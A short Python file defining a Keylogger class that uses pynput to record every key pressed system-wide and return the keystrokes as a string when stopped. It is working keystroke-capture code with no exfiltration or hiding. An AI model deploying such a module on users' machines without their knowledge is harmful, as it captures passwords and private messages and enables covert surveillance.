from pynput import keyboard


class Keylogger:
    _listener = None
    _logs = []

    @staticmethod
    def _on_press(key):
        try:
            Keylogger._logs.append(key.char)
        except AttributeError:
            Keylogger._logs.append(f"<{key}>")

    @classmethod
    def start(cls):
        cls._logs = []
        cls._listener = keyboard.Listener(on_press=cls._on_press)
        cls._listener.start()

    @classmethod
    def stop(cls) -> str:
        if cls._listener:
            cls._listener.stop()
        return ''.join(cls._logs)
